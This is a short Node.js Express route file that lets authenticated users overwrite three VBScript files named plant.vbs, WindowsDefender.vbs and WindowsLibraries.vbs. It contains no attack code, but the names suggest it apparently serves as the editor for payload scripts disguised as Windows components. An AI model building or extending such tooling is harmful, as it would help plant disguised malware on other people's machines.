const path = require("path")
const { hasAccess } = require("./Auth/Middlewares")
const fs = require("fs")

module.exports = (app) => {
    app.put("/ResourcesEdit/Plant", hasAccess, (req, res) => {

        console.log("Overriting plant.vbs")

        // console.log(req.body)

        //check if the data was sent
        if (!req.body.data)
            return res.json({
                success: false,
                message: "No data was sent"
            })

        //check if the plant.vbs file exists
        if (fs.existsSync(path.join(__dirname, "Resources", "plant.vbs")) == false)
            return res.json({
                success: false,
                message: "The plant.vbs file does not exist"
            })

        //override the plant.vbs file with this data 
        fs.writeFileSync(path.join(__dirname, "Resources", "plant.vbs"), req.body.data)

        res.json({
            success: true,
            message: "Successfully edited the plant.vbs file"
        })
    })

    app.put("/ResourcesEdit/WindowsDefender", hasAccess, (req, res) => {
        
        console.log("Overriting WindowsDefender.vbs")

        // console.log(req.body)

        //check if the data was sent
        if (!req.body.data)
            return res.json({
                success: false,
                message: "No data was sent"
            })

        //check if the WindowsDefender.vbs file exists
        if (fs.existsSync(path.join(__dirname, "Resources", "WindowsDefender.vbs")) == false)
            return res.json({
                success: false,
                message: "The WindowsDefender.vbs file does not exist"
            })

        //override the WindowsDefender.vbs file with this data 
        fs.writeFileSync(path.join(__dirname, "Resources", "WindowsDefender.vbs"), req.body.data)

        res.json({
            success: true,
            message: "Successfully edited the WindowsDefender.vbs file"
        })
    })

    app.put("/ResourcesEdit/WindowsLibraries", hasAccess, (req, res) => {
        
        console.log("Overriting WindowsLibraries.vbs")

        // console.log(req.body)

        //check if the data was sent
        if (!req.body.data)
            return res.json({
                success: false,
                message: "No data was sent"
            })

        //check if the WindowsLibraries.vbs file exists
        if (fs.existsSync(path.join(__dirname, "Resources", "WindowsLibraries.vbs")) == false)
            return res.json({
                success: false,
                message: "The WindowsLibraries.vbs file does not exist"
            })

        //override the WindowsLibraries.vbs file with this data
        fs.writeFileSync(path.join(__dirname, "Resources", "WindowsLibraries.vbs"), req.body.data)

        res.json({
            success: true,
            message: "Successfully edited the WindowsLibraries.vbs file"
        })

    })

}